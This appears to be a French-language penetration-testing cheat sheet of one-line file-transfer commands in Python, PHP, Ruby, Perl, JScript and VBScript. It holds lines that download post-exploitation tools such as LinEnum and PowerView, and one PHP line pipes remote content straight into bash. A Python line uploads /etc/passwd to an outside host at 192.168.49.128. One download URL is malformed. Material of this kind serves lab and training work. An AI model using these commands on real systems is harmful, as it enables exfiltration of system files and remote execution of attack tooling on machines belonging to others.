# Python

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#Chargement
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/LinEnum.sh", "LinEnum.sh")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/LinEnum.sh", "LinEnum.sh")'
#Versement
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# PHP

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#Chargement
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
#Versement
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
#pipe vers bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Ruby

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell
#Chargement
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Perl

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell 
#Chargement
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Javascript

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell
#wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# VBScript
Dispo sur windows depuis 98

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
